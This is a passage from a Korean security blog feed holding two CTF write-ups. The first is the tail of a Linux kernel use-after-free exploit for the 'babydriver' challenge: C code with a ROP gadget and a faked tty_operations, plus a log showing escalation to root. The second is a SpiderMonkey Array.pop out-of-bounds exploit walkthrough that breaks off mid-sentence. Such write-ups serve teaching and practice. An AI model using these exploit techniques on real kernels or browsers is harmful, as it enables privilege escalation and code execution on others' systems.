&amp;rop;</span><br><span class="line">    tty_operations[<span class="number">2</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line">    tty_operations[<span class="number">7</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> baby1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> baby2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(baby1, <span class="number">65537</span>, <span class="number">736</span>);</span><br><span class="line">    close(baby1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ptmx = open(<span class="string">"/dev/ptmx"</span>, O_RDWR|O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    read(baby2, tty_struct, <span class="number">32</span>);</span><br><span class="line">    tty_struct[<span class="number">3</span>] = &amp;tty_operations;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&amp;rop : %p\n"</span>, &amp;rop);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&amp;tty_operations : %p\n"</span>, &amp;tty_operations);</span><br><span class="line"></span><br><span class="line">    write(baby2, tty_struct, <span class="number">32</span>);</span><br><span class="line">    write(ptmx, trig, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -masm=intel  -static -o exploit exploit.c</span><br></pre></td></tr></table></figure><p>exploit을 다 작성했으면 위의 옵션으로 컴파일해서, 환경 설정 과정에서 <code>rootfs.cpio</code> 파일 시스템의 압축을 풀었던 디렉토리에 옮긴 뒤에</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure><p>위 명령어로 압축하면 새로운 <code>roofts.cpio</code> 파일이 나오는데 이 <code>rootfs.cpio</code> 파일을 이용해서 qemu를 실행하시면 해당 exploit 파일이 qemu 내부로 들어간 것을 확인할 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Boot took 0.93 seconds</span><br><span class="line"></span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">/ $ ./exploit</span><br><span class="line">[   10.168566] device open</span><br><span class="line">[   10.170749] device open</span><br><span class="line">[   10.171988] alloc <span class="keyword">done</span></span><br><span class="line">[   10.173196] device release</span><br><span class="line">&amp;rop : 0x7ffdba0f7390</span><br><span class="line">&amp;tty_operations : 0x6bb340</span><br><span class="line">[   10.176799] tty driver ptm lacks a write_room method.</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><hr></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=29327365" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=29327365</a></p></li><li><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=25624658" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=25624658</a></p></li><li><p><a href="https://elixir.bootlin.com/linux/v4.4/source/include" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4/source/include</a></p></li><li><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel</a></p></li><li><p><a href="https://www.kernel.org/doc/html/v4.11/dev-tools/gdb-kernel-debugging.html" target="_blank" rel="noopener">https://www.kernel.org/doc/html/v4.11/dev-tools/gdb-kernel-debugging.html</a></p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>2017_codegate_js_world write up</title>
      <link>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/</link>
      <guid>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/</guid>
      <pubDate>Fri, 18 Oct 2019 10:52:21 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;목차&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;환경구성&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;OOB 배열 생성&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;데이터 읽기&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Array 객체 분석&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Exploit&lt;/p&gt;
&lt;/li
        
      
      </description>
      
      <content:encoded><![CDATA[<p>목차</p><ul><li><p>환경구성</p></li><li><p>OOB 배열 생성</p></li><li><p>데이터 읽기</p></li><li><p>Array 객체 분석</p></li><li><p>Exploit</p></li></ul><hr><h3 id="환경-구성"><a href="#환경-구성" class="headerlink" title="환경 구성"></a>환경 구성</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip gcc make g++ perl python autoconf -y</span><br><span class="line">mkdir mozilla</span><br><span class="line"><span class="built_in">cd</span> mozilla</span><br><span class="line">wget http://ftp.mozilla.org/pub/mozilla.org/js/mozjs-24.2.0.tar.bz2</span><br><span class="line">tar xjf mozjs-24.2.0.tar.bz2</span><br></pre></td></tr></table></figure><p>이렇게 입력을 하면 <code>mozilla 24.2.0</code>를 다운받을 수 있다.</p><p>이제 <strong>주어진 파일과 기존 mozilla 24.2.0이 뭐가 달라졌는 지</strong> 보면된다. </p><p><code>js_array.cpp</code>가 주어졌으니 이 파일을 원본 파일과 비교해보면 되고 원본 파일의 위치는 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozjs-24.2.0/js/src/js_array.cpp</span><br></pre></td></tr></table></figure><p>리눅스의 <code>diff</code>를 이용해서 비교한 결과는 다음과 같다.</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1947,1950c1947</span><br><span class="line">&lt;     if (index == 0) &#123;</span><br><span class="line">&lt;         /* Step 4b. */</span><br><span class="line">&lt;         args.rval().setUndefined();</span><br><span class="line">&lt;     &#125; else &#123;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt; </span><br><span class="line">1962c1959</span><br><span class="line">&lt;     &#125;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt; </span><br><span class="line">1967c1964</span><br><span class="line">&lt;     if (obj-&gt;isNative() &amp;&amp; obj-&gt;getDenseInitializedLength() &gt; index)</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;     if (obj-&gt;isNative())</span><br></pre></td></tr></table></figure><p>조금 더 한 눈에 보여주는 사진은 다음과 같다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089040-a635f380-f1e1-11e9-9e83-cb559cb167a7.PNG" alt="1"></p><p>빨간색 부분이 변한 부분이다.  Array는 인덱스와 길이 정보를 가진다. (<a href="[https://defenit.kr/2019/10/15/Pwn/%E3%84%B4%20Research/JSE_%EA%B8%B0%EB%B3%B8_%EA%B0%9C%EB%85%90/](https://defenit.kr/2019/10/15/Pwn/ㄴ Research/JSE_기본_개념/">참고</a>))</p><p><strong>기존의 코드엔 pop 명령어를 사용할 때 Array의 index가 0이면 길이 정보가 감소하지 않고 index가 0이 아닐때는 길이 정보를 하나 감소하는 루틴</strong>이 있었다. <strong>하지만 그 루틴을 제거</strong> 해버린 모습이다.</p><p>이제 원본 소스를 주어진 파일대로 수정한 후 컴파일을 진행할 것이다. 주어진 파일을 쓰지않고 다운받아서 컴파일을 하는 이유는 심볼이 없기 때문이다. 컴파일 명령은 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../mozjs-24.2.0/js/src/configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><hr><h3 id="OOB-배열-생성"><a href="#OOB-배열-생성" class="headerlink" title="OOB 배열 생성"></a>OOB 배열 생성</h3><p>기존 Array는 pop할때 인덱스가 0이라면 아무 작업을 하지 않는다. 하지만 현재는 <strong>인덱스가 0일 때 pop을 하면 1이 감소되면서 길이 정보가 0xffffffff가 되기 때문에 OOB가 발생</strong>한다. </p><p>OOB가 발생하는 배열을 만들어서 OOB Read를 하는 소스 코드는 다음과 같다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">a.pop()</span><br><span class="line"></span><br><span class="line">print (<span class="string">'length: '</span> + a.length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">print(a[i]);</span><br></pre></td></tr></table></figure><p>a라는 배열 바로 뒤에 b 배열을 두고 pop을 통해서 oob를 트리거 했다.</p><p>해당 코드를 <strong>실행하는 방법</strong>은 build에 들어있는 js라는 파일을 이용하면 된다. <strong>js파일의 인자로 작성한 파일을 넘겨주면 실행이 된다.</strong> (ex: build/js exp.js)</p><p>실행했을 때의 결과는 다음과 같다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length: 4294967295</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">6.9063791040899e-310</span><br><span class="line">6.9063790999006e-310</span><br><span class="line">0</span><br><span class="line">6.9063791034334e-310</span><br><span class="line">4.243991582e-314</span><br><span class="line">4.243991583e-314</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>length 값이 42억으로 나온걸 봐선 unsigned int인 듯 하다. 그리고 undefined는 배열의 요소가 있었던 자리였는데, pop을 통해 뺐기 때문에 뜨는 것이다.  그 이후에 소수가 막 나오다가 3, 4가 나오는데 b 배열의 요소 값일 것이다.</p><hr><h3 id="데이터-읽기"><a href="#데이터-읽기" class="headerlink" title="데이터 읽기"></a>데이터 읽기</h3><p>기본적으로 파이어폭스에서는 <code>jsval</code>을 <code>double</code>로 표현하는데 array를 통해서 <code>oob read</code> 및 <code>oob write</code>를 하기 위해선 double 데이터를 int로, int를 double 데이터로 바꿀 수 있어야 할 것이다.</p><p>그래서 dtoi 함수와 itod 함수를 만들었고 <code>dtoi</code> 부터 보겠다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dtoi</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = data;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">res += (<span class="string">'0'</span> + bytes[bytes.length - <span class="number">1</span> - i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(res, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>먼저 <code>Float64Array 하나</code>와 <code>Uint8Array 8개</code>를 만들었는데, 숫자를 보면 알겠지만 Float는 8byte고 Uint는 1byte 배열이다. <strong>Uint64Array 한개가 아니라 Uint8Array 8개인 이유는 리틀 엔디안으로 바꿔야하기 때문</strong>이다.</p><p>그 후에 정렬해서 16진수 문자열 형태로 만들고 <code>parseInt</code>로 int로 만들면 된다.</p><p>이제 <code>itod</code>를 보겠다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itod</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">var</span> hexed = (<span class="string">'0000000000000000'</span> + data.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i+=<span class="number">2</span>)</span><br><span class="line">res.push(<span class="built_in">parseInt</span>(hexed.substr(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bytes.set(res.reverse());</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>마찬가지로 정렬해서 16진수로 만들고 이를 배열로 만든후 리틀 엔디안으로 만들어주기 위해 <code>reverse</code>를 한다. 여기서 하나 의아해할 수 있는 동작은 bytes에 값을 복사했는데 반환은 f[0]을 한다는 것인데, 같은 데이터를 가리키고 있다고 생각하면 된다.  (자세한건 <a href="https://developer.mozilla.org/ko/docs/Web/JavaScript/Typed_arrays" target="_blank" rel="noopener">여기</a>를 참고하면 될 것이다.)</p><p>아, 그리고 다음과 같이 파이썬 처럼 <code>hex</code> 함수도 만들었다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'0x'</span> + data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이제 다음과 같은 코드로 깔끔하게 출력을 해보겠다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dtoi</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = data;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">res += (<span class="string">'0'</span> + bytes[bytes.length - <span class="number">1</span> - i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(res, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itod</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">var</span> hexed = (<span class="string">'0000000000000000'</span> + data.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i+=<span class="number">2</span>)</span><br><span class="line">res.push(<span class="built_in">parseInt</span>(hexed.substr(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bytes.set(res.reverse());</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'0x'</span> + data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">a.pop()</span><br><span class="line"></span><br><span class="line">print (<span class="string">'length: '</span> + a.length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">print (hex(dtoi(a[i])))</span><br></pre></td></tr></table></figure><p>결과 값은 다음과 같다. (편-안)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length: 0xffffffff</span><br><span class="line">0x7ff8000000000000</span><br><span class="line">0x7ff8000000000000</span><br><span class="line">0x7f5b15646358</span><br><span class="line">0x7f5b15631820</span><br><span class="line">0x0</span><br><span class="line">0x7f5b15642f70</span><br><span class="line">0x200000000</span><br><span class="line">0x200000002</span><br><span class="line">0x4008000000000000</span><br><span class="line">0x4010000000000000</span><br></pre></td></tr></table></figure><hr><h3 id="Array-객체-분석"><a href="#Array-객체-분석" class="headerlink" title="Array 객체 분석"></a>Array 객체 분석</h3><p>다음과 같은 코드를 짜고 디버깅을 할 것이다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x41414141</span>, <span class="number">0x42424242</span>, <span class="number">0x43434343</span>]</span><br><span class="line">a.length = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="built_in">Math</span>.atan(a)</span><br></pre></td></tr></table></figure><p><code>Math.atan</code>은 보통 <strong>디버깅을 할 때 사용</strong>한다. 인자로 a를 준 이유는 Math.atan에 브포를 걸고 해당 함수의 인자 확인을 통해 a에 쉽게 접근하기 위함이다.</p><p><code>gdb -q build/js</code>로 gdb를 열고 <code>b *js::math_atan</code>를 통해 Math.atan에 브포를 건 뒤 <code>r [자바스크립트 파일 명]</code>로 실행한다. </p><p>그럼 다음과 같은 화면이 보인다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">202</span>     <span class="keyword">return</span> cache-&gt;lookup(<span class="built_in">atan</span>, x);</span><br><span class="line"><span class="number">203</span> &#125;</span><br><span class="line"><span class="number">204</span> </span><br><span class="line"><span class="number">205</span> JSBool</span><br><span class="line"><span class="number">206</span> js::math_atan(JSContext *cx, <span class="keyword">unsigned</span> argc, Value *vp)</span><br><span class="line"><span class="number">207</span> &#123;</span><br><span class="line"><span class="number">208</span>     CallArgs args = CallArgsFromVp(argc, vp);</span><br><span class="line"><span class="number">209</span> </span><br><span class="line"><span class="number">210</span>     <span class="keyword">if</span> (args.length() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">211</span>         args.rval().setDouble(js_NaN);</span><br><span class="line"><span class="number">212</span>         <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>math_atan 함수의 원형을 보면 대충 3번째 인자가 우리가 넣은 값이라고 생각된다. 그럼 <code>rdx</code>를 확인해보면 된다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089041-a7ffb700-f1e1-11e9-855a-9b1981e3ba88.PNG" alt="2"></p><p>위 사진에서 빨간색 표시를 한 부분이 a라는 배열의 주소이다. 일반적으로 64bit 시스템에서 주소는 6byte를 사용한다. 위 사진에선 8byte를 모두 사용하고 있는데, <strong>상위 2.5byte는 Type을 의미하고 하위 5.5byte는 Value</strong>이다.</p><p>주소는 6byte고 보통 앞에 7이 붙기 때문에 앞에 7 붙히고 나머지 5.5byte 붙혀서 값을 보면 된다. 값을 보면 다음과 같다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089043-aa621100-f1e1-11e9-9007-a495e6ce7728.PNG" alt="3"></p><p><span style="color:red">빨간 부분: Array의 데이터의 주소</span></p><p><span style="color:blue">파란 부분: Array의 크기</span></p><p><span style="color:green">초록 부분: Array의 데이터</span></p><p>처음에 작성한 코드를 보면 length 값을 직접적으로 0xdeadbeef로 변경 했었다. 하지만 그렇게 해도 oob는 발생하지 않은데 그 이유는 다음과 같다.</p><p><strong>배열의 크기는 총 2개가 존재</strong>한다. 하나는 <strong>실제 메모리상에 할당된 C++ 배열의 크기</strong>, 또 하나는 <strong>자바스크립트 상의 가상 배열의 크기</strong>이다. <strong>위 코드에선 단순히 가상 배열의 크기만 바뀌었기 때문에 OOB가 발생하지 않는다.</strong></p><p>즉 <strong>실제 메모리에 할당된 C++ 배열의 크기를 바꿔주어야 OOB 취약점이 발생</strong>하고 이를 위해 pop을 통해서 취약점을 트리거 하는 것이다. pop을 통해 oob array를 만든 후 디버깅을 해보면 다음과 같이 두 가지의 크기 모두 0xffffffff으로 표시된다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089047-ac2bd480-f1e1-11e9-9693-8d7f2940ab2c.PNG" alt="4"></p><p>length가 바뀌게 되며 OOB Read는 쉽게 트리거 했었고 OOB Write를 트리거 하는 법에 대해서 잠깐 적어보자면, Array의 데이터 주소를 조작하는 법이 있다.</p><p>인덱스가 음수가 될 순 없기 때문에 현재 Array의 데이터 주소는 조작 못하지만, Array를 하나 더 만든 후 다음 Array의 데이터 주소를 찾아서 조작할 수 있다. 그 후엔 다음 Array를 가지고 조작된 주소로 부터 원하는대로 값을 쓰면 된다.</p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>익스플로잇에 사용할 방법은 <code>JIT Code Overwrite</code>이다.</p><p><code>JIT</code>는 쉽게 말해서 <strong>자주 사용하는 코드를 미리 바이트 코드로 만들어놓고 메모리에 올려서 실행하는 것</strong>이다. 여기서 중요한 점은 바이트 코드를 메모리에 올릴 때 메모리에 실행권한이 부여되기에 이 주소를 알 수 있다면 셸 코드를 넣을 수 있을 것이다.</p><p>익스 플로잇을 하기 전에 JIT가 어떻게 돌아가는지 부터 잠깐 살펴보겠다.</p><p> <code>mozjs-24.2.0/js/src/jit/BaselineJIT.cpp</code>의 <code>EnterBaseline</code> 함수를 수정해볼 것이다. 해당 파일을 열어서 104번째 줄을 다음과 같이 수정하면 된다. <strong>JIT가 트리거될 때 jitcode 주소를 출력해주는 것</strong>이다.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Single transition point from Interpreter to Baseline.</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JIT: %p\n"</span>, data.jitcode);</span><br><span class="line"></span><br><span class="line">        enter(data.jitcode, data.maxArgc, data.maxArgv, data.osrFrame, data.calleeToken,</span><br><span class="line">              data.scopeChain, data.osrNumStackValues, data.result.address());</span><br></pre></td></tr></table></figure><p>수정한 후 다시 make를 해주면 수정한 내용이 반영된다.</p><p>위에서 적은대로 JIT는 자주 사용하는 코드에 쓰이는데, 다른 말로 표현하면 <strong>자주 호출되는 함수</strong>라고 할 수 있다. 테스트를 위해 다음과 같은 코드를 작성했다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">print(<span class="string">'hi'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">test()</span><br></pre></td></tr></table></figure><p>12까지 반복한 이유는 10~12번째 반복에 JIT 주소가 